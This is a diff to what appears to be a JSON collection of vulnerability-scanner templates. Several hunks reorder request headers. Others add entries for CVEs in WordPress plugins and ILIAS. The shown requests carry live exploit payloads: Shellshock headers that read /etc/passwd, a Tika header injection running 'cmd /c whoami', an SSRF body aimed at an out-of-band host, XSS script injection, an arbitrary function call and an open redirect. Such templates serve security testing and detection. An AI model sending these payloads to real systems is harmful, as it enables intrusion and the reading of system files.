@@ -3436,9 +3436,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue",
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -10409,8 +10409,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -15816,6 +15816,20 @@
       ]
     },
     {
+      "id": "CVE-2021-25099",
+      "info": {
+        "name": "Give < 2.17.3 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\naction=give_checkout_login&form_id=xxxxxx\"><script>alert(document.domain)</script>\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25104",
       "info": {
         "name": "WordPress Ocean Extra <1.9.5 - Cross-Site Scripting",
@@ -20895,6 +20909,21 @@
       ]
     },
     {
+      "id": "CVE-2022-2314",
+      "info": {
+        "name": "VR Calendar < 2.3.2 - Unauthenticated Arbitrary Function Call",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-content/plugins/vr-calendar-sync/assets/js/public.js HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-admin/admin-post.php?vrc_cmd=phpinfo HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-23178",
       "info": {
         "name": "Crestron Device - Credentials Disclosure",
@@ -23340,6 +23369,22 @@
           "raw": [
             "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-45917",
+      "info": {
+        "name": "ILIAS eLearning platform <= 7.15 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/shib_logout.php?action=logout&return=https://example.com",
+            "{{BaseURL}}/ilias/shib_logout.php?action=logout&return=https://example.com"
           ]
         }
       ]
